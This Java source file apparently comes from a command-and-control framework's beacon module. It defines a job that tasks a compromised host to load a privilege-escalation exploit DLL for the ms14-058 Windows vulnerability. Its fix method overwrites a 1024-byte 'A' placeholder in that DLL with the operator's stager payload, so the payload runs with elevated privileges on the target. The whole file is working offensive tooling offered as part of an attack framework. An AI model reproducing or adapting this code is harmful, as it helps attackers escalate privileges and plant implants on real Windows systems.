package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Listener;

public class ElevateJob
        extends Job {
    protected String commandz;
    protected String listener;
    protected byte[] stager;

    public ElevateJob(TaskBeacon tasker, String listener, byte[] stager) {
        super(tasker);
        this.listener = listener;
        this.stager = stager;
    }

    @Override
    public String getDescription() {
        return "Tasked beacon to run " + Listener.getListener(this.listener) + " via ms14-058";
    }

    @Override
    public String getShortDescription() {
        return "elevate";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/elevate.x64.dll";
        }
        return "resources/elevate.dll";
    }

    @Override
    public String getTactic() {
        return "T1068";
    }

    @Override
    public String getPipeName() {
        return "elevate";
    }

    @Override
    public int getCallbackType() {
        return 0;
    }

    @Override
    public int getWaitTime() {
        return 5000;
    }

    @Override
    public byte[] fix(byte[] mydll) {
        String dataz = CommonUtils.bString(mydll);
        int index = dataz.indexOf(CommonUtils.repeat("A", 1024));
        dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(this.stager), index);
        return CommonUtils.toBytes(dataz);
    }
}

